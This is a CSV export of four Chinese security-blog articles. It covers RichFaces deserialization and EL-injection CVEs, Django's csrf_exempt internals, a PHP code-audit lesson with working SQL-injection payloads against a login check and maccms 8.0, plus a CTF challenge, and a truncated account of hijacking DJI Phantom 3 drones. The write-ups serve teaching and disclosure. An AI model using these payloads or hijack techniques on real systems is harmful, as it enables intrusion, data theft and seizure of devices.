"_id","abstract","author","content","published_date","tags","title","url"
"5cca991be0c518ef8fd59743","jsf介绍JavaServer Faces（JSF）是一个为网络应用程序构建基于组件的用户界面的Java规范[1]，并已通过JCP格式化为Java EE的一部分。它也是一个MVC Web应用框架，通过…","0c0c0f","jsf介绍JavaServer Faces（JSF）是一个为网络应用程序构建基于组件的用户界面的Java规范[1]，并已通过JCP格式化为Java EE的一部分。它也是一个MVC Web应用框架，通过在页面中使用可重用的UI组件简化了基于服务器的应用程序的用户界面（UI）。[8]JSF implementations: Mojarra/Myfaces(javax.faces-api/ jsf-impl+jsf-api / myfaces-impl+myfaces-api)EL interfaces (javax.el-api /tomcat-jasper-el)EL implementations: Jasper/Jboss (tomcat-jasper-el/ jasper-el / jboss-el) Richfaces的安全历史安全问题都出现在资源处理程序处理请求方式上，执行流程如下:-&gt; 获取处理过程相关的类，比如从URI中获取X，并且从参数do获取X的序列化状态对象-(1)-&gt; 反序列化状态对象--(2)-&gt; 创建X的一个实例并恢复其状态---(3)-&gt; 处理X并产生匹配的响应（图像、视频、表格等） RichFaces 33.1.0 ≤ 3.3.3: CVE-2013-21653.1.0 ≤ 3.3.4: RF-14310RichFaces 44.0.0 ≤ 4.3.2: CVE-2013-21654.0.0 ≤ 4.5.4: CVE-2015-02794.5.3 ≤ 4.5.17: RF-14309 CVE-2013-2165: Arbitrary Java Deserializationin RichFaces 3.x ≤ 3.3.3 and 4.x ≤ 4.3.2漏洞分析以及Exphttps://tint0.com/matesctf-2018-wutfaces-cve-2013-2165/ CVE-2015-0279: Arbitrary EL Evaluation inRichFaces 4.x ≤ 4.5.3 (RF-13977)漏洞触发/richfaces-showcase/rfRes/org.richfaces.resource.MediaOutputResource.jsf?do=Exp见https://issues.jboss.org/browse/RF-13977 RF-14310: Arbitrary EL Evaluation inRichFaces 3.x ≤ 3.3.4漏洞触发org.richfaces.renderkit.html.Paint2DResource/DATA/跟漏洞CVE-2015-0279/RF-13799类似,问题出现在org.richfaces.renderkit.html.Paint2DResource 这个类,当一个资源请求被调用,会调用他的send(ResourceContext)方法,传递的参数是org.richfaces.renderkit.html.Paint2DResource$ImageData对象,如图:TagMethodExpression类的orig属性中包含el表达式,我们在构造poc的时候需要将恶意的的el表到时set进去。漏洞利用的思路就是需要构造一个恶意ImageData对象里面包含我们自动定义的el表达式,el表达式可以是远程加载一个jar,也可以也写文件、反弹shell等附一张利用成功的截图 RF-14309: Arbitrary EL Evaluation inRichFaces 4.5.3 ≤ 4.5.17  NO CVE  By pass CVE-2015-0279CVE-2015-0279的补丁[5]禁增加了contentProducer来处理特殊符号([^\(]*)以缓解表达式注入问题。但是EL表达式支持定义函数映射和变量映射, 可以通过ELResolver解决函数(${prefix:name()})和变量（${var.property}）映射到方法和表达式value的实例，richface 4.5.3版本中各种VariableMapper已经然如白名单中。所以利用这个特性，只需要在contentProducer方法表达式中使用变量，如$ {dummy.toString}，并在方法表达式中添对应的VariableMapper，最终会映射到具体的ValueExpression。具体利用在RF13977基础上修改下:CVE-2018-12532[2] 漏洞是在RF-14309基础上变形的payload稳定性更好。Gadget的结构Ljava.lang.Object[5] [0] = (java.lang.Boolean) false [3] = (javax.faces.component.StateHolderSaver)   savedState = (org.apache.el.MethodExpressionImpl)     expr = (java.lang.String) ""foo.toString""     varMapper =(org.apache.el.lang.VariableMapperImpl)       vars = (Ljava.util.HashMap)        {(java.lang.String)""foo"":(java.lang.String)[EL_TO_INJECT]}利用如下payload未能执行命令https://blog.mindedsecurity.com/2015/11/reliable-os-shell-with-el-expression.htmlhttps://srcincite.io/blog/2017/05/22/from-serialized-to-shell-auditing-google-web-toolkit-with-el-injection.htmlEL表达式执行的三个限制限制1 EL总是会调用Class.getMethods()数组中名字相匹配的第一个方法,其他重载方法不会调用。限制2 Jasper’s EL 的实现(tomcat-jasper-el) 7.0.53 to 8.0.25的一个bug导致不能通过反射调用无参方法。限制3只有Jasper的EL实现支持将参数列表隐式转换为args。其他的实现（例如jboss-el）args需要一个数组作为参数，所以需要构造一个数组。最终的payload:总结:需要对漏洞组件和java的些特性非常熟悉才能找到更多的绕过方式。[1]https://codewhitesec.blogspot.com/2018/05/poor-richfaces.html[2]https://tint0.com/when-el-injection-meets-java-deserialization/#footnote1[3]https://tint0.com/matesctf-2018-wutfaces-cve-2013-2165/[4]https://docs.oracle.com/javaee/7/api/javax/el/ELResolver.html[5]https://bugzilla.redhat.com/attachment.cgi?id=1005892[6]https://examples.javacodegeeks.com/enterprise-java/jsf/jsf-elresolver-example/[7]https://docs.oracle.com/javaee/7/api/javax/el/ValueExpression.html[8] https://zh.wikipedia.org/wiki/JavaServer_Faces[9] https://github.com/apache/tomcat/commit/b7ce5679b9e6a073dadbc31e6ecde12ad1e0ede8","2018-09-25 15:44:35","代码审计","RichFaces反序列化漏洞","https://www.secpulse.com/archives/75882.html"
"5cca991be0c518ef8fd59744","0x00. 引言公司内部自动化代码审计系统需要将每次审计结果推送至堡垒机存储，最开始，每次推送都失败，后来查明是因为触发了堡垒机的CSRF校验机制。所以希望对这个推送接口关闭CSRF校验，最后发现可以…","hOlKSOMX","0x00. 引言公司内部自动化代码审计系统需要将每次审计结果推送至堡垒机存储，最开始，每次推送都失败，后来查明是因为触发了堡垒机的CSRF校验机制。所以希望对这个推送接口关闭CSRF校验，最后发现可以使用csrf_exempt这个Django自带的装饰器函数满足需求，处于好奇心，研究了csrf_exempt的实现原理，于是有了本文。0x01. 可以实现对视图放开CSRF校验的3种方式通过分析Django CSRF中间件源码可知：如果想对某一个视图放开CSRF校验，有3种方式1）干掉CSRF中间件2）在CSRF中间件生效之前，使得request对象有_dont_enforce_csrf_checks 属性，且为True由上图源码可知：如果request对象有_dont_enforce_csrf_checks 属性，且为True，则接受此次请求，相当于不进行csrf 校验3）视图函数有csrf_exempt 属性，且为True视图函数有csrf_exempt 属性，且为True，则返回None，相当于放弃CSRF 校验1）和 2） 都是基于全局的，这样以来，所有的视图都会放弃CSRF校验只有3）可以自由的决定哪一个视图应该放弃CSRF校验，只要这个视图含有csrf_exempt 属性，且为True，则放弃CSRF校验，怎么样才能使得视图含有csrf_exempt 属性，且为True。很简单有，两种方法，一种是手动添加，给每一个视图函数增加一个csrf_exempt 属性，且为True另外一个是在每一个需要放弃CSRF校验的视图上加上一个csrf_exempt的属性，显然第二种方式更优雅，也符合解耦原则那么下面我们就开始分析下Django 自带的装饰器函数 csrf_exempt 的实现原理0x02. csrf_exempt 装饰器函数实现原理from django.views.decorators.csrf import csrf_exempt只需要在需要放开CSRF校验的视图上使用这个装饰器即可绕过CSRF校验机制注意： 这里需要注意的是,csrf_exempt 装饰器 必须放在最上面，我们知道Django中的装饰器的顺序是从底至上，如果不放在最上面，这绕过CSRF校验机制失败，原因在0X02中会解释我们再来看一下Django CSRF中间件的代码，在process_view 函数中会对请求进行CSRF 校验这里callback 指的是视图函数注意第二个红框，意为：如果视图函数有csrf_exempt属性，且值为True，则实现绕过csrf校验好了，我们在看一下csrf_exempt 装饰器函数代码：from functools import wrapsfrom django.utils.decorators import available_attrsdef csrf_exempt(view_func):    """"""    Marks a view function as being exempt from the CSRF view protection.    """"""    # We could just do view_func.csrf_exempt = True, but decorators    # are nicer if they don't have side-effects, so we return a new    # function.    def wrapped_view(*args, **kwargs):        return view_func(*args, **kwargs)    wrapped_view.csrf_exempt = True    return wraps(view_func, assigned=available_attrs(view_func))(wrapped_view)首先跟一下functools 中的wraps def wraps(wrapped,          assigned = WRAPPER_ASSIGNMENTS,          updated = WRAPPER_UPDATES):    """"""Decorator factory to apply update_wrapper() to a wrapper function       Returns a decorator that invokes update_wrapper() with the decorated       function as the wrapper argument and the arguments to wraps() as the       remaining arguments. Default arguments are as for update_wrapper().       This is a convenience function to simplify applying partial() to       update_wrapper().    """"""    return partial(update_wrapper, wrapped=wrapped,                   assigned=assigned, updated=updated)也就是说：wraps(view_func, assigned=available_attrs(view_func)) 返回的是一个偏函数，函数为：update_wrapper，默认参数为wrapped=视图函数，assigned=视图函数的属性，updated=要更新的属性，默认为WRAPPER_UPDATES = ('dict',)要理解  wraps(view_func, assigned=available_attrs(view_func))(wrapped_view) 返回的是啥，则需要进一步跟一下update_wrapper：def update_wrapper(wrapper,                   wrapped,                   assigned = WRAPPER_ASSIGNMENTS,                   updated = WRAPPER_UPDATES):    """"""Update a wrapper function to look like the wrapped function       wrapper is the function to be updated       wrapped is the original function       assigned is a tuple naming the attributes assigned directly       from the wrapped function to the wrapper function (defaults to       functools.WRAPPER_ASSIGNMENTS)       updated is a tuple naming the attributes of the wrapper that       are updated with the corresponding attribute from the wrapped       function (defaults to functools.WRAPPER_UPDATES)    """"""    for attr in assigned:        setattr(wrapper, attr, getattr(wrapped, attr))    for attr in updated:        getattr(wrapper, attr).update(getattr(wrapped, attr, {}))    # Return the wrapper so this can be used as a decorator via partial()    return wrapperupdate_wrapper 参数中的wrapper即为csrf_exempt装饰器函数 中的wrapped_view函数for attr in assigned:        setattr(wrapper, attr, getattr(wrapped, attr))    将视图函数中的属性拷贝至wrapped_view 函数中最后返回wrapped_view 函数在csrf_exempt 装饰器函数中有这么一行代码：wrapped_view.csrf_exempt = True也就是给wrapped_view加了一个属性csrf_exempt，且值为True从而绕过了CSRF 校验。从源码角度理解Django 中给特定视图函数放开CSRF校验的原理 https://www.secpulse.com/archives/76204.html经过装饰器装饰的视图函数最后返回的也是一个函数，如果csrf_exempt装饰器函数不放在最上面，则经过装饰器返回的函数中则无csrf_exempt 属性，导致绕过CSRF 校验失败不行我们来做个测试：测试代码：#! -*- coding:utf8 -*-from functools import wrapsfrom django.utils.decorators import available_attrsdef is_valid_json(func):    """"""    检测post的数据是否为合法json    不带参装饰器    :return:    """"""    def wrapper(*args, **kwargs):        print ""is_valid_json""        return func(*args, **kwargs)    return wrapperdef csrf_exempt(view_func):    """"""    Marks a view function as being exempt from the CSRF view protection.    """"""    # We could just do view_func.csrf_exempt = True, but decorators    # are nicer if they don't have side-effects, so we return a new    # function.    def wrapped_view(*args, **kwargs):        return view_func(*args, **kwargs)    wrapped_view.csrf_exempt = True    return wraps(view_func, assigned=available_attrs(view_func))(wrapped_view)@is_valid_json@csrf_exemptdef test():    print ""test""if __name__ == '__main__':    print getattr(test, 'csrf_exempt', False)csrf_exempt 装饰器放在最上面结果为Truecsrf_exempt 装饰器不放在最上面=结果为False0x03. 总结为了搞明白csrf_exempt这个装饰器函数的原理，分析了Django的CSRF 中间件实现原理，加深了对Django安全机制的理解，对以后的安全开发、安全培训（比如给Python开发的同学讲解Django的安全机制）、代码审计都很有好处，Python的安全愈发引起大家的注意，也希望更多的同学加入到Python安全的分享当中来。从源码角度理解Django 中给特定视图函数放开CSRF校验的原理 https://www.secpulse.com/archives/76204.html","2018-10-08 9:00:33","代码审计","从源码角度理解Django中给特定视图函数放开CSRF校验的原理","https://www.secpulse.com/archives/76204.html"
"5cca991be0c518ef8fd59745","本文由红日安全成员： l1nk3r 编写，如有不当，还望斧正。本文转载自先知社区：https://xz.aliyun.com/t/2864 前言大家好，我们是红日安全-代码审计小组…","红日安全团队","本文由红日安全成员： l1nk3r 编写，如有不当，还望斧正。本文转载自先知社区：https://xz.aliyun.com/t/2864 前言大家好，我们是红日安全-代码审计小组。最近我们小组正在做一个PHP代码审计的项目，供大家学习交流，我们给这个项目起了一个名字叫 PHP-Audit-Labs 。现在大家所看到的系列文章，属于项目 第一阶段 的内容，本阶段的内容题目均来自 PHP SECURITY CALENDAR 2017 。对于每一道题目，我们均给出对应的分析，并结合实际CMS进行解说。在文章的最后，我们还会留一道CTF题目，供大家练习，希望大家喜欢。下面是 第13篇 代码审计文章：Day 13 - Turkey Baster代码如下：这是一道典型的用户登录程序，从代码来看，考察的应该是通过 SQL注入 绕过登陆验证。代码 第33行 ，通过 POST 方式传入 user 和 passwd 两个参数，通过 isValid() 来判断登陆是否合法。我们跟进一下 isValid() 这个函数，该函数主要功能代码在 第12行-第22行 ，我们看到 13行 和 14行 调用 sanitizeInput() 针对 user 和 password 进行相关处理。跟进一下 sanitizeInput() ，主要功能代码在 第24行-第29行 ，这里针对输入的数据调用 addslashes 函数进行处理，然后再针对处理后的内容进行长度的判断，如果长度大于20，就只截取前20个字符。 addslashes 函数定义如下：addslashes — 使用反斜线引用字符串string addslashes ( string $str )作用：在单引号（'）、双引号（""）、反斜线（\）与 NUL（ NULL 字符）字符之前加上反斜线。我们来看个例子：那这题已经过滤了单引号，正常情况下是没有注入了，那为什么还能导致注入了，原因实际上出在了 substr 函数，我们先看这个函数的定义：substr — 返回字符串的子串string substr ( string $string , int $start [, int $length ] )作用：返回字符串 string 由 start 和 length 参数指定的子字符串。我们来看个例子：那么再回到这里，我们知道反斜杠可以取消特殊字符的用法，而注入想要通过单引号闭合，在这道题里势必会引入反斜杠。所以我们能否在反斜杠与单引号之间截断掉，只留一个反斜杠呢？答案是可以，我们看个以下这个例子。在这个例子中，我们直接使用题目代码中的过滤代码，并且成功在反斜杠和单引号之间截断了，那我们把这个payload带入到题目代码中，拼接一下 第17行-第19行 代码中的sql语句。select count(p) from user u where user = '1234567890123456789\' AND password = '$pass'这里的sql语句由于反斜杠的原因， user = '1234567890123456789\' 最后这个单引号便失去了它的作用。这里我们让 pass=or 1=1# ，那么最后的sql语句如下：select count(p) from user where user = '1234567890123456789\' AND password = 'or 1=1#'这时候在此SQL语句中， user 值为 1234567890123456789\' AND password = ，因此我们可以保证带入数据库执行的结果为 True ，然后就能够顺利地通过验证。所以这题最后的 payload 如下所示：user=1234567890123456789'&amp;passwd=or 1=1#实例分析这里的实例分析，我们选择 苹果CMS视频分享程序 8.0 进行相关漏洞分析。漏洞的位置是在 inc\common\template.php ，我们先看看相关代码：这里代码的 第三行-第四行 位置， $lp['wd'] 变量位置存在字符串拼接，很明显存在 sql注入 ，但是这个cms具有一些通用的注入防护，所以我们从头开始一步步的看。首先在 inc\module\vod.php 文件中的，我们看到 第一行 代码当 $method=search 成立的时候，进入了 第3行 中的 be(""all"", ""wd"") 获取请求中 wd 参数的值，并且使用 chkSql() 函数针对 wd 参数的值进行处理。部分关键代码如下所示：跟进一下 be() 函数，其位置在 inc\common\function.php 文件中，关键代码如下：这部分代码的作用就是对 GET，POST，REQUEST 接收到的参数进行 addslashes 的转义处理。根据前面针对 be(""all"", ""wd"") 的分析，我们知道 wd 参数的值是通过 REQUEST 方式接收，并使用 addslashes 函数进行转义处理。再回到 inc\module\vod.php 文件中的，我们跟进一下 chkSql() 函数，该函数位置在 inc\common\360_safe3.php 文件中，具体代码如下：分析一下这部分代码的作用，其实就是在 第8行-第12行 针对接收到的的变量进行循环的 urldecode （也就是url解码）动作，然后在 第15行 ，使用 StopAttack 函数解码后的数据进行处理，最后将处理后的数据通过 htmlEncode 方法进行最后的处理，然后返回处理之后的值。我们先跟进一下 StopAttack 函数，该函数位置在 inc\common\360_safe3.php 文件中，我们截取部分相关代码如下：我们看到代码的 第13行-第19行 调用正则进行处理，而相关的正则表达式是 $ArrFiltReq 变量。这里 第13行 的 $ArrFiltReq 变量就是前面传入的 $getfilter ，即语句变成：preg_match(""/"".$getfilter.""/is"",1)我们跟进一下 $getfilter 变量。该变量在 inc\common\360_safe3.php 文件中，我们截取部分相关代码如下：这串代码的功能显而易见，就是检测 GET，POST，COOKIE 中的恶意数据。刚刚在 chkSql() 函数最后有串代码是： return htmlEncode($s); ，我们跟进一下 htmlEncode 函数。该函数位置在 inc\common\function.php 文件中，相关代码如下：这段代码的功能是针对 &amp; 、 ' 、 空格 、 "" 、 TAB 、 回车 、 换行 、 大于小于号 等符号进行实体编码转换。但是这里百密一疏，没有针对其他的空白字符和反斜杠进行处理。这里先埋下一个伏笔，我们继续往下看。首先注入点是在 inc\common\template.php ，相关代码如下：我们继续看看这个 $lp['wd'] 的值是怎么获取的，在 inc\common\template.php 文件中找到其相关代码：上图 第13行 ，当 P['wd'] 不为空的时候， $lp['wd'] 是从 P[""wd""] 中获取到数据的。根据前面我们的分析，在 inc\module\vod.php 文件中的存在这样一行代码： $tpl-&gt;P[""wd""] = $wd;而 wd 是可以从 REQUEST 中获取到，所以这里的 wd 实际上是可控的。漏洞验证现在我们需要针对漏洞进行验证工作，这就涉及到POC的构造。在前面分析中，我们知道 htmlEncode 针对 &amp; 、 ' 、 空格 、 ""、 TAB 、 回车 、 换行 、 大于小于号 进行实体编码转换。但是这里的注入类型是字符型注入，需要引入单引号来进行闭合，但是 htmlEncode 函数又对单引号进行了处理。因此我们可以换个思路。我们看到注入攻击的时候，我们的 $lp['wd'] 参数可以控制SQL语句中的两个位置，因此这里我们可以通过引入 反斜杠 进行单引号的闭合，但是针对前面的分析我们知道其调用了 addslashes 函数进行转义处理，而 addslashes 会对 反斜杠 进行处理，但是这里对用户请求的参数又会先进行 url解码 的操作，因此这里可以使用 双url编码 绕过 addslashes 函数。POST /maccms8/index.php?m=vod-search HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 98Connection: keep-aliveUpgrade-Insecure-Requests: 1wd=))||if((select%0b(select(m_name)``from(mac_manager))regexp(0x5e61)),(`sleep`(3)),0)#%25%35%63payload传到程序里，经过拼接后的数据库语句如下所示：漏洞修复这里的防御手段其实已经很多了，但就是因为这么多防御手段结合在一起出现了有趣的绕过方式。function htmlEncode($str){	if (!isN($str)){		$str = str_replace(chr(38), ""&amp;#38;"",$str);		$str = str_replace(""&gt;"", ""&amp;gt;"",$str);		$str = str_replace(""&lt;"", ""&amp;lt;"",$str);		$str = str_replace(chr(39), ""&amp;#39;"",$str);		$str = str_replace(chr(32), ""&amp;nbsp;"",$str);		$str = str_replace(chr(34), ""&amp;quot;"",$str);		$str = str_replace(chr(9), ""&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;"",$str);		$str = str_replace(chr(13), ""&lt;br /&gt;"",$str);		$str = str_replace(chr(10), ""&lt;br /&gt;"",$str);        $str = str_replace(chr(92), ""&lt;br /&gt;"",$str);      //新增修复代码	}	return $str;}反斜杠的ascii码是92，这里新增一行代码处理反斜杠。结语看完了上述分析，不知道大家是否对 htmlentities 函数在使用过程中可能产生的问题，有了更加深入的理解，文中用到的代码可以从 这里 下载，当然文中若有不当之处，还望各位斧正。如果你对我们的项目感兴趣，欢迎发送邮件到 hongrisec@gmail.com 联系我们。 Day13 的分析文章就到这里，我们最后留了一道CTF题目给大家练手，题目如下：//index.php&lt;?phprequire 'db.inc.php';  function dhtmlspecialchars($string) {      if (is_array($string)) {          foreach ($string as $key =&gt; $val) {              $string[$key] = dhtmlspecialchars($val);          }      }      else {          $string = str_replace(array('&amp;', '""', '&lt;', '&gt;', '(', ')'), array('&amp;amp;', '&amp;quot;', '&amp;lt;', '&amp;gt;', '（', '）'), $string);          if (strpos($string, '&amp;amp;#') !== false) {              $string = preg_replace('/&amp;amp;((#(\d{3,5}|x[a-fA-F0-9]{4}));)/', '&amp;\\1', $string);          }      }      return $string;  }  function dowith_sql($str) {        $check = preg_match('/select|insert|update|delete|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/is', $str);        if ($check) {        echo ""非法字符!"";       exit();      }     return $str; }  // 经过第一个waf处理  foreach ($_REQUEST as $key =&gt; $value) {      $_REQUEST[$key] = dowith_sql($value);  }  // 经过第二个WAF处理  $request_uri = explode(""?"", $_SERVER['REQUEST_URI']);  if (isset($request_uri[1])) {      $rewrite_url = explode(""&amp;"", $request_uri[1]);      foreach ($rewrite_url as $key =&gt; $value) {          $_value = explode(""="", $value);          if (isset($_value[1])) {              $_REQUEST[$_value[0]] = dhtmlspecialchars(addslashes($_value[1]));          }      }  }  // 业务处理  if (isset($_REQUEST['submit'])) {      $user_id = $_REQUEST['i_d'];      $sql = ""select * from ctf.users where id=$user_id"";      $result=mysql_query($sql);      while($row = mysql_fetch_array($result))      {          echo ""&lt;tr&gt;"";          echo ""&lt;td&gt;"" . $row['name'] . ""&lt;/td&gt;"";          echo ""&lt;/tr&gt;"";      }  }?&gt;//db.inc.php&lt;?php$mysql_server_name=""localhost"";$mysql_database=""ctf"";    /** 数据库的名称 */$mysql_username=""root"";  /** MySQL数据库用户名 */$mysql_password=""root"";  /** MySQL数据库密码 */$conn = mysql_connect($mysql_server_name, $mysql_username,$mysql_password,'utf-8');?&gt;//ctf.sql# Host: localhost  (Version: 5.5.53)# Date: 2018-08-18 21:42:20# Generator: MySQL-Front 5.3  (Build 4.234)/*!40101 SET NAMES utf8 */;## Structure for table ""users""#DROP TABLE IF EXISTS `users`;CREATE TABLE `users` (  `Id` int(11) NOT NULL AUTO_INCREMENT,  `name` varchar(255) DEFAULT NULL,  `pass` varchar(255) DEFAULT NULL,  `flag` varchar(255) DEFAULT NULL,  PRIMARY KEY (`Id`)) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;## Data for table ""users""#/*!40000 ALTER TABLE `users` DISABLE KEYS */;INSERT INTO `users` VALUES (1,'admin','qwer!@#zxca','hrctf{R3qu3st_Is_1nterEst1ng}');/*!40000 ALTER TABLE `users` ENABLE KEYS */;参考文章PHP的两个特性导致waf绕过注入request导致的安全性问题分析","2018-11-13 17:05:59","代码审计","[红日安全]代码审计Day13 — 特定场合下addslashes函数的绕过","https://www.secpulse.com/archives/80696.html"
"5cca991be0c518ef8fd59746","0x00 背景  在2015年GeekPwn的开场项目中，笔者利用一系列漏洞成功演示劫持了一架正在飞行的大疆精灵3代无人机，夺取了这台无人机的控制权，完成了可能是全球首次对大疆无人机的劫持和完整控制。…","blackhold","0x00 背景 在2015年GeekPwn的开场项目中，笔者利用一系列漏洞成功演示劫持了一架正在飞行的大疆精灵3代无人机，夺取了这台无人机的控制权，完成了可能是全球首次对大疆无人机的劫持和完整控制。GeekPwn结束后，组委会立即将漏洞通知给官方，而大疆也很快完成了漏洞的修复。今年的3月15号，大疆发布了全新一代的精灵4代无人机，精灵3代从此退居二线；同时央视315晚会也对去年GeekPwn的这个劫持项目进行了详细的报道。考虑到这些漏洞的修复已经过了足够长的时间，我们决定公开漏洞的完整细节和利用流程，希望能为国内的方兴未艾的射频安全研究圈子贡献自己的一份力量。本文争取以零基础的角度对整个发现和利用过程抽丝剥茧，并尽量详细阐述这个过程中涉及的技术细节。本文涉及的技术细节适用大疆精灵3代，2代和1代，不适用最新的精灵4代无人机。由于行文时间仓促，如有疏漏敬请斧正。0x01 攻击场景讨论：风险真实存在但可控 可能是因为近两年无人机的曝光率颇高，去年GeekPwn上完成无人机劫持项目后感兴趣的电视台和媒体并不少，也引发了普通群众的讨论和担心。虽然我们已经证明并演示了精灵系列无人机是可以被劫持和完整控制的，但想要在实际环境中的直接将公园、景区、街道上空飞行的无人机据为己有，信号增益和劫持后的稳定控制仍然是需要深入研究的问题。或许在官方遥控器上加载自己的万能遥控器ROM，然后直接借用官方遥控器的信号增益和控制系统，会是一个可行的方案。此外，造成劫持的漏洞已经得到合理的修复，新版ROM发布也已经超过4个月。随着安全研究者的攻防研究以及官方的重视，实际能攻击的精灵无人机也会越来越少。所以，我们的结论是，普通群众不用过于担忧无人机的安全问题，反而应该更关注越来越多的走入普通人家的智能设备的安全问题。顺便提一下，这块我们团队亦有关注（比如同样是参加了GeekPwn 2015和央视315晚会的烤箱和POS机），后续还会有更多的研究成果放出。好了，现在开始我们的无人机劫持之旅。0x02 抽丝剥茧：精灵系列遥控原理全解析 0x0200 射频硬件初探 要黑掉无人机，第一步要做的是信息收集。我们先来了解一下精灵3代所使用的射频硬件。图1 拆开的精灵3代遥控器（左图）和无人机主机（右图）左翻右翻，经过了一系列艰难的电焊拆解和吹风机刮除保护膜后，终于找到了负责射频通信的芯片和负责逻辑的主控芯片，并识别出了它们的型号。看得出来大疆对电路板刻意做了一些防拆解和信息保护。从下面的图中能识别出来，主控芯片选择的是知名大厂NXP的LPC1765系列，120MHz主频，支持USB 2.0，和射频芯片使用SPI接口进行通讯。而射频芯片则是国产BEKEN的BK5811系列，工作频率为5.725GHz – 5.852GHz或者5.135GHz – 5.262GHz，共有125个频点，1MHz间隔，支持FSK/GFSK调制解调，使用ShockBurst封包格式，并且支持跳频，使用经典的SPI接口进行控制。图2 主控芯片图3 射频芯片而这个参数强大的国产射频芯片激起了我们的兴趣，经过一些挖掘，发现这个芯片原来山寨自NORDIC的nRF24L01+，没错，就是这个号称性价比之王的nRF24L01+ 2.4GHz射频芯片的5.8GHz版本，更有意思的是这两个不同厂家芯片的datasheet中绝大部分内容都是通用的。通过这些基本的硬件信息确定了射频的频段后，我们马上拿出HackRF在gqrx中观察5.8GHz的信号。看着瀑布图（下图4）中跳来跳去的小黄线，我们意识到精灵3的射频通讯应该是跳频的，而在不知道跳频序列的情况下，无法对射频信号进行完整解调。此时HackRF的射频分析基本上派不上用处，唯有通过逻辑分析仪来看看射频芯片是如何跳频的。图4 使用gqrx观察射频信号0x0201 不得已的控制逻辑追踪     从上一节获得的硬件信息中，我们已经知道主控芯片和射频芯片之间是采用SPI接口进行通讯和控制的，因此只要从BK5811的引脚中找到SPI需要的那四个引脚，连上逻辑分析仪，对这四个引脚的电位变化进行采样分析，我们就能看到主控芯片是如何控制射频芯片的跳频了。0x020100 SPI接口定义 SPI协议本身其实挺简单的，在CS信号为低电位时，SCK通过脉冲控制通讯的时钟频率，每个时钟周期里，SI为输入，SO为输出，通过SI和SO在每个时钟里高低电位的切换构成一个bit，每八个时钟周期构成一个字节，从而形成一个连续的字节流，一个字节流代表一个命令，由射频芯片的datasheet约定好。SPI协议通讯示意图如下所示，其中四个引脚分别为：SO（MISO）：主设备数据输出，从设备数据输入。SI（MOSI）：主设备数据输入，从设备数据输出。SCK（CLK）：时钟信号，由主设备产生。CS（CSN）：从设备使能信号，由主设备控制。图5 SPI协议通讯示意图0x020101 连接逻辑分析仪 通过BK5811的datasheet，我们定位到了SPI通信的那几个引脚（如图6），通过万用表确认引脚连通性，然后在可以电焊的地方通过飞线连上逻辑分析仪的测试钩，折腾了很久总算连上了（如图7）。 图6 BK5811中SPI引脚定义图7 通过电焊和飞线将BK5811的SPI引脚连上逻辑分析仪随后，从逻辑分析仪中，我们得到了作为安全人员来说最喜欢的二进制数据流。0x020102 射频芯片控制命令解析 在BK5811的datasheet中，明确定义了它所支持的每一条SPI命令。通过连续的电位变化传过来一个完整的SPI命令如下所示：图8 逻辑分析仪中的一个SPI命令其中0x30是命令号，高3位代表操作是写BK5811的寄存器，而寄存器id由这个字节中的低5位决定，是0x10，而0x10代表写的内容是ShockBurst的发送地址（类似以太网的mac地址）。而后面五字节（0x11 0x22 0x33 0x44 0x19）则是发送地址本身。0x020103 跳频逻辑总结 通过一段时间的观察，我们发现SPI命令颇为简单，为了方便观察大量命令的序列，我们按照datasheet中的定义写了一个解析脚本，在脚本的帮助下终于整理清楚了跳频的流程。图9 SPI命令解析脚本在大疆的定义下，完整的跳频序列有16个频点，这些频点在遥控器和无人机主机配对（一般发生在出厂前）时通过随机产生，一旦确定后就存储固定起来，除非手动重新配对。遥控器打开后，会以7ms的周期，按照跳频序列指定的顺序来变化射频发射的频率，16次（112ms）一个循环，而在每一个周期内，发射一次遥控的控制数据。一个典型的SPI命令序列如：&lt;跳频&gt; 1ms &lt;发包&gt; 6ms图10 遥控器SPI命令数字逻辑示意图对于无人机主机，则是以1ms的周期来变化接收信号的频率，一旦收到来自遥控器的射频信号（BK5811会使用上文所说的发送和接收地址来识别通过），则转而进入7ms的周期，和遥控器保持同步。一旦信号丢失，马上又恢复1ms的跳频周期。一个典型的SPI命令序列如：&lt;跳频&gt; &lt;查包&gt; 1ms &lt;查包&gt; 1ms &lt;查包&gt; 1ms &lt;查包&gt; 1ms &lt;查包&gt; 1ms &lt;查包&gt; 1ms &lt;查包&gt;。图11 无人机主机SPI命令数字逻辑示意图从上面的分析我们能注意到，遥控器只负责发送数据，无人机主机只负责接收数据，两者之间并无射频上的交互。这为我们后面覆盖遥控器的信号打好了基础。0x0202 模拟信号到数字信号的鸿沟 在搞清楚遥控的工作流程后，我们知道是可以对其进行完全的模拟（先假设射频序列已知），创造出一个以假乱真的遥控来。但在加工二进制命令前，如何完成二进制命令中数字化的数据和真实世界中连续的电磁波之间的转换困扰了我们很久，笔者甚至很长一段时间都在想重回大学修满通信专业的科目。0x020200 电磁波和GFSK制式的基本原理 先补一点从学通信的同事那里偷师回来的基本常识。电磁波在我们的世界中连续的传播，通过特定的方式可以使其携带二进制信息，这个方式称为调制解调。发送数据时，一般是将的调制好的基带信号（含二进制信息）和载波信号叠加后进行发送，通常基带信号的频率会比载波信号频率低很多，如BK5811的载波信号频率在5.8GHz左右，但基带信号的频率仅为2MHz。而接收方通过解调和滤波，将基带信号从接收到的载波信号中分离出来，随后进行采样和A/D转换得到二进制数据。FSK（Frequency-shift keying）是一种经典的基于频率的调制解调方式，其传递数据的方式也很简单。例如约定500KHz代表0，而1000KHz代表1，并且以1ms作为采样周期，如果某1ms内基带信号的频率是500KHz，这表明这是一个0，而如果下1ms内基带信号的频率为1000KHz，那表明下一位二进制比特是1。简单来说，FSK制式就是通过这样连续的电磁波来连续的传递二进制数据。图12 FSK调制解调示意图而GFSK制式仅仅是在FSK制式的基础上，在调制之前通过一个高斯低通滤波器来限制信号的频谱宽度，以此来提升信号的传播性能。0x020201 GFSK解调和IQ解调 